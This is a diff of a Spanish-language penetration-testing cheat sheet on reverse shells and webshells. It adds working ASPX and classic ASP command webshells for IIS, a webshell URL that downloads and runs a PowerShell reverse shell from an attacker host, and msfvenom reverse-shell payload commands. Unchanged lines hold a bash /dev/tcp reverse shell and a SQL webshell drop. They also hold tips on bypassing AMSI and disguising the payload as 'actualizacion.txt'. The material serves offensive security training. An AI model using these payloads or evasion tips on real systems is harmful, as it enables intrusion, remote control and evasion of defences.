@@ -8,6 +8,7 @@ Tags: #ReverseShell #BindShell #ForwardShell #Webshell #Netcat #PowerShell #PHP 
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [PowerShell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
 * [P0wny Shell Webshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)
+* [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)
 
 ## TIPOS
 ```
@@ -127,12 +128,7 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 # Usar el dominio y puerto de ngrok en el script
 ❯ echo "Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215" >> Invoke-PowerShellTcp.ps1
 
-# Agregar
-❯ nvim Invoke-PowershellTCP.ps1
-
-	Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215 
-
-Nota: 
+NOTA: 
 	1. Debemos Bypasear AMSI, de lo contrario nos detectara codigo malicioso
 	2. Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
 	3. Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
@@ -254,6 +250,7 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 # Guardar como .pyz → ejecutable en Windows al hacer doble click
 ```
 
+
 ---
 
 ## 4. WEBSHELLS
@@ -346,6 +343,68 @@ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
 SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' FROM mysql.user LIMIT 1;
 -- Acceder: http://IP/shell.php?cmd=whoami
 ```
+
+### ASPX / ASP — Webshells para IIS (Windows)
+
+```aspx
+<%-- cmd.aspx → webshell básica para IIS --%>
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<% 
+    string cmd = Request.QueryString["cmd"];
+    if (cmd != null) {
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.Start();
+        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+        p.WaitForExit();
+    }
+%>
+```
+
+```asp
+<%-- cmd.asp → webshell para IIS antiguo (ASP clásico) --%>
+<%
+Dim cmd
+cmd = Request.QueryString("cmd")
+If cmd <> "" Then
+    Dim oShell
+    Set oShell = CreateObject("WScript.Shell")
+    Dim oExec
+    Set oExec = oShell.Exec("cmd.exe /c " & cmd)
+    Response.Write "<pre>" & oExec.StdOut.ReadAll() & "</pre>"
+End If
+%>
+```
+
+```bash
+# Acceder a la webshell subida
+❯ http://<IP>/cmd.aspx?cmd=whoami
+❯ http://<IP>/cmd.asp?cmd=whoami
+
+# Ejecutar reverse shell desde la webshell → URL encoded
+❯ http://<IP>/cmd.aspx?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"
+
+# Con msfvenom → generar ASPX con reverse shell directa
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=443 -f aspx -o reverse.aspx
+# Subir el .aspx → acceder desde el navegador → recibir con nc -nlvp 443
+
+❯ msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=443 -f asp -o reverse.asp
+# Para IIS antiguo → x86
+
+# Rutas comunes donde subir el archivo en IIS
+C:\inetpub\wwwroot\          → raíz del servidor web → acceder en http://IP/cmd.aspx
+C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
+```
+
+### Insight
+- ASPX → IIS moderno (Windows Server 2012+) → usar -f aspx en msfvenom
+- ASP → IIS antiguo (Windows Server 2003/2008) → usar -f asp en msfvenom
+- Si WebDAV está habilitado → subir con cadaver directamente
+- Si hay upload en la web → probar subir .aspx directamente o con doble extensión shell.aspx.jpg
 
 ---
 
